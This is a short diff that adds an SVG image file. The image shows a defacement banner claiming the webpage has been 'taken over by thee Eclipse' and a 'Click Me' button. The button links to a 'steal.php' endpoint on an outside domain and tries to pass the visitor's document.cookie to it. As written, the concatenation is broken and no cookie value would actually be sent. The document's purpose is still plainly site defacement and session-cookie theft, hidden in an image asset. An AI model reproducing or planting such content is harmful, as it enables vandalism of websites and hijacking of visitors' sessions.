@@ -1,0 +1,10 @@
+<svg width="80%" height="80%" xmlns="http://www.w3.org/2000/svg">
+     <rect x="10" y="10" width="150%" height="150%" fill="#FF69B4" />
+	<!-- Text Element -->
+    <text x="40%" y="20%" font-family="Arial" fill="red">THIS IS A WEBPAGE TAKEN OVER BY THEE ECLIPSE</text>
+    <!-- Link and Rectangle -->
+    <a href="https://hackersrising.com/steal.php?cookie+(document.cookie)">
+        <rect x="50%" y="50%" width="200" height="60" rx="10" ry="10" fill="#007BFF" />
+        <text x="60%" y="60%" font-family="Arial" font-size="20" fill="white" text-anchor="middle">Click Me</text>
+    </a>
+</svg>
